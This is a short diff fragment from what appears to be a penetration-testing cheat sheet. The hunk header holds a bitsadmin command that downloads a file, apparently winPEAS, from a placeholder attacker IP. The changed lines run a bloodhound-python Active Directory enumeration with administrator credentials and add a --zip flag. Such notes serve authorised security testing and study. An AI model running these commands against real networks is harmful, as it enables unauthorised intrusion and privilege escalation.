@@ -13,7 +13,7 @@ bitsadmin /transfer winpeastask /download /priority high http://<attacker-ip>/wi
 
 BLOODHOUND
 
-bloodhound-python -u administrator -p 'P@ssw0rd!' -d example.local -c All -ns 192.168.1.100
+bloodhound-python -u administrator -p 'P@ssw0rd!' -d example.local -c All -ns 192.168.1.100 --zip
 
 Parameters:
 
